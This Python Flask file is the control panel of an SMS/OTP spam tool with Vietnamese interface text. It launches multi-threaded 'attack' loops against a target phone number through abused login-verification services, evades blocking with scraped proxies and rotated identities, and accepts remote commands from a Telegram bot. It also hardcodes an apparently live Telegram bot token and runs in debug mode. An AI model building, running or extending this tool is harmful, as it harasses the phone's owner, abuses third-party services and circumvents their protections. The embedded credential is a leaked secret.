from flask import Flask, render_template, request, jsonify, Response
import threading
import time
import spam_otp
import proxy_scraper
from datetime import datetime
import json

app = Flask(__name__)

# Global variables
SPAM_RUNNING = False
SPAM_THREADS = []
LOG_MESSAGES = []
MAX_LOGS = 200
STATS = {"sent": 0, "success": 0, "fail": 0, "threads": 0}
SERVICE_HEALTH = {}
START_TIME = None
AI_TRACKER = None  # Reference to SmartServiceTracker

def add_log(message, log_type="system"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    LOG_MESSAGES.append({"text": log_entry, "type": log_type})
    if len(LOG_MESSAGES) > MAX_LOGS:
        LOG_MESSAGES.pop(0)

def spam_loop_task(phone, delay, proxies, attack_mode='carpet'):
    global SPAM_RUNNING, STATS, AI_TRACKER
    spam_instance = spam_otp.SpamOTP(phone, proxies=proxies, attack_mode=attack_mode)
    AI_TRACKER = spam_instance.tracker
    
    def custom_log(msg):
        msg_lower = msg.lower()
        
        # Success: ✓ or "verified" or "ok"
        if "✓" in msg or "verified" in msg_lower:
            STATS["success"] += 1
            STATS["sent"] += 1
            add_log(msg, "success")
        # Fail: ✗ or "fail" or "error" or "lỗi" or "timeout" or "dns" or "block"
        elif "✗" in msg or any(kw in msg_lower for kw in ["fail", "lỗi", "error", "timeout", "dns dead", "block"]):
            STATS["fail"] += 1
            STATS["sent"] += 1
            add_log(msg, "error")
        # Batch summary or system messages
        elif msg.startswith("📊") or msg.startswith("🧠") or msg.startswith("🔄") or msg.startswith("⏸"):
            add_log(msg, "system")
        # HTTP non-200 responses
        elif "HTTP" in msg:
            STATS["fail"] += 1
            STATS["sent"] += 1
            add_log(msg, "info")
        else:
            STATS["sent"] += 1
            add_log(msg, "info")
    
    spam_instance.log = custom_log
    add_log(f"⚡ Thread started | {phone} | Mode: {attack_mode}", "system")
    
    while SPAM_RUNNING:
        try:
            spam_instance.run_batch(delay=delay)
            time.sleep(delay)
        except Exception as e:
            add_log(f"Thread Error: {str(e)[:80]}", "error")
            break
    
    add_log("Thread stopped.", "system")

# ==================== ROUTES ====================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/health')
def health_page():
    return render_template('health.html')

@app.route('/proxies')
def proxy_manager():
    return render_template('proxy_manager.html')

@app.route('/guide')
def guide():
    return render_template('guide.html')

@app.route('/proxy-guide')
def proxy_guide_old():
    return render_template('guide.html')

# ==================== SSE STREAMING ====================

@app.route('/api/stream')
def stream_logs():
    def event_stream():
        last_log_count = 0
        while True:
            current_count = len(LOG_MESSAGES)
            if current_count > last_log_count:
                new_logs = LOG_MESSAGES[last_log_count:]
                data = {
                    "logs": new_logs,
                    "stats": STATS.copy(),
                    "running": SPAM_RUNNING,
                    "elapsed": int(time.time() - START_TIME) if START_TIME and SPAM_RUNNING else 0
                }
                yield f"data: {json.dumps(data, ensure_ascii=False)}\n\n"
                last_log_count = current_count
            elif not SPAM_RUNNING and last_log_count > 0:
                data = {"logs": [], "stats": STATS.copy(), "running": False, "elapsed": 0}
                yield f"data: {json.dumps(data, ensure_ascii=False)}\n\n"
                break
            time.sleep(0.3)
    
    return Response(event_stream(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

# ==================== API ====================

@app.route('/api/status', methods=['GET'])
def get_status():
    elapsed = int(time.time() - START_TIME) if START_TIME and SPAM_RUNNING else 0
    return jsonify({"running": SPAM_RUNNING, "stats": STATS, "logs": LOG_MESSAGES, "elapsed": elapsed})

@app.route('/api/start', methods=['POST'])
def start_spam():
    global SPAM_RUNNING, SPAM_THREADS, STATS, LOG_MESSAGES, START_TIME, SERVICE_HEALTH, AI_TRACKER
    data = request.json
    phone = data.get('phone')
    delay = float(data.get('delay', 2.0))
    thread_count = int(data.get('threads', 1))
    proxies_raw = data.get('proxies', '')
    attack_mode = data.get('mode', 'carpet')
    auto_proxy = data.get('auto_proxy', False)
    
    if not phone or len(phone) < 9:
        return jsonify({'status': 'error', 'message': 'Số điện thoại không hợp lệ'}), 400
    if SPAM_RUNNING:
        return jsonify({'status': 'error', 'message': 'Đang chạy rồi!'}), 400

    STATS = {"sent": 0, "success": 0, "fail": 0, "threads": thread_count}
    SERVICE_HEALTH = {}
    AI_TRACKER = None
    LOG_MESSAGES.clear()
    START_TIME = time.time()

    proxies = []
    if auto_proxy:
        add_log("⚡ Auto-Proxy: Đang quét...", "system")
        def scrape_and_start():
            global SPAM_THREADS
            try:
                scraper = proxy_scraper.ProxyScraper()
                nonlocal proxies
                proxies = scraper.get_proxies()
                add_log(f"✅ Proxy: {len(proxies)} sống!", "success")
            except Exception as e:
                add_log(f"⚠️ Proxy Error: {str(e)[:60]}", "error")
                proxies = []
            for i in range(thread_count):
                t = threading.Thread(target=spam_loop_task, args=(phone, delay, proxies, attack_mode))
                t.daemon = True
                t.start()
                SPAM_THREADS.append(t)
            add_log(f"🚀 {phone} | {attack_mode.upper()} | {thread_count} luồng | ASYNC ENGINE", "system")
        
        SPAM_RUNNING = True
        SPAM_THREADS = []
        bg = threading.Thread(target=scrape_and_start)
        bg.daemon = True
        bg.start()
    else:
        if proxies_raw:
            proxies = [p.strip() for p in proxies_raw.split('\n') if p.strip()]
        SPAM_RUNNING = True
        SPAM_THREADS = []
        for i in range(thread_count):
            t = threading.Thread(target=spam_loop_task, args=(phone, delay, proxies, attack_mode))
            t.daemon = True
            t.start()
            SPAM_THREADS.append(t)
        add_log(f"🚀 {phone} | {attack_mode.upper()} | {thread_count} luồng | ASYNC ENGINE", "system")
    
    return jsonify({'status': 'success', 'message': f'ASYNC Engine: {thread_count} luồng {attack_mode.upper()}'})

@app.route('/api/stop', methods=['POST'])
def stop_spam():
    global SPAM_RUNNING, START_TIME
    if not SPAM_RUNNING:
        return jsonify({'status': 'error', 'message': 'Không đang chạy'}), 400
    SPAM_RUNNING = False
    STATS["threads"] = 0
    START_TIME = None
    add_log("🛑 Đã dừng.", "system")
    return jsonify({'status': 'success', 'message': 'Đã dừng!'})

@app.route('/api/reset_identity', methods=['POST'])
def reset_identity():
    add_log("🔄 Identity Reset: User-Agent & Cookie rotated", "system")
    return jsonify({'status': 'success', 'message': 'OK'})

@app.route('/api/ai_stats', methods=['GET'])
def get_ai_stats():
    """Return AI Smart Retry brain state"""
    if AI_TRACKER:
        return jsonify(AI_TRACKER.get_stats())
    return jsonify({})

@app.route('/api/health', methods=['GET'])
def get_health():
    return jsonify(SERVICE_HEALTH)

@app.route('/api/health/test', methods=['POST'])
def test_all_services():
    import requests as req
    health = {}
    try:
        with open('services.json', 'r', encoding='utf-8') as f:
            services = json.load(f)
    except Exception:
        return jsonify({"error": "Cannot load services.json"}), 500
    
    test_phone = "0901234567"
    
    def test_service(service):
        name = service.get("name", "Unknown")
        url = service.get("url", "").replace("{phone}", test_phone)
        phone_raw = test_phone[1:] if test_phone.startswith('0') else test_phone
        url = url.replace("{phone_raw}", phone_raw)
        try:
            method = service.get("method", "GET").lower()
            headers = {"user-agent": "Mozilla/5.0 Chrome/131.0.0.0"}
            if "headers" in service:
                headers.update(service["headers"])
            kwargs: dict = {"headers": headers, "timeout": 8, "verify": False}
            if "json" in service:
                payload = json.dumps(service["json"]).replace("{phone}", test_phone).replace("{phone_raw}", phone_raw)
                kwargs["json"] = json.loads(payload)
            if "data" in service:
                kwargs["data"] = service["data"].replace("{phone}", test_phone).replace("{phone_raw}", phone_raw)
            start = time.time()
            resp = req.get(url, **kwargs) if method == "get" else req.post(url, **kwargs)
            elapsed = round((time.time() - start) * 1000)
            status = "alive" if resp.status_code == 200 else ("slow" if resp.status_code < 500 else "dead")
            health[name] = {"status": status, "code": resp.status_code, "time_ms": elapsed}
        except req.exceptions.Timeout:
            health[name] = {"status": "slow", "code": 0, "time_ms": 8000}
        except Exception as e:
            health[name] = {"status": "dead", "code": 0, "time_ms": 0, "error": str(e)[:80]}
    
    threads = []
    for service in services:
        t = threading.Thread(target=test_service, args=(service,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=15)
    
    return jsonify(health)

# ==================== TELEGRAM ====================

TELEGRAM_BOT = None
TELEGRAM_TOKEN = "8406827765:AAF_HUzbk01ZLaLsJOwwlsDwxzRMY5GblAE"
TELEGRAM_CHAT_ID = ""

def start_telegram_bot_thread():
    global TELEGRAM_BOT
    if not TELEGRAM_TOKEN:
        return
    import telegram_bot
    
    def bot_start_attack(phone, delay, threads, proxies, mode):
        global SPAM_RUNNING, SPAM_THREADS, STATS
        if SPAM_RUNNING:
            return {"status": "error", "message": "Already running!"}
        STATS = {"sent": 0, "success": 0, "fail": 0, "threads": threads}
        SPAM_RUNNING = True
        SPAM_THREADS = []
        for i in range(threads):
            t = threading.Thread(target=spam_loop_task, args=(phone, delay, proxies, mode))
            t.daemon = True
            t.start()
            SPAM_THREADS.append(t)
        return {"status": "success", "message": f"Attack started on {phone}"}

    def bot_stop_attack():
        global SPAM_RUNNING
        if not SPAM_RUNNING:
            return {"status": "error", "message": "Not running"}
        SPAM_RUNNING = False
        STATS["threads"] = 0
        return {"status": "success", "message": "Stopped"}

    def bot_get_status():
        s = STATS.copy()
        s['running'] = SPAM_RUNNING
        return s

    try:
        TELEGRAM_BOT = telegram_bot.Spambot(TELEGRAM_TOKEN, bot_start_attack, bot_stop_attack, bot_get_status)
        t = threading.Thread(target=TELEGRAM_BOT.start)
        t.daemon = True
        t.start()
    except Exception as e:
        add_log(f"Telegram: {str(e)[:60]}", "error")

@app.route('/api/telegram_config', methods=['POST'])
def telegram_config():
    global TELEGRAM_TOKEN, TELEGRAM_CHAT_ID
    data = request.json
    TELEGRAM_TOKEN = data.get('token')
    TELEGRAM_CHAT_ID = data.get('chat_id')
    start_telegram_bot_thread()
    return jsonify({'status': 'success', 'message': 'Saved!'})

if __name__ == '__main__':
    start_telegram_bot_thread()
    app.run(debug=True, port=5000)
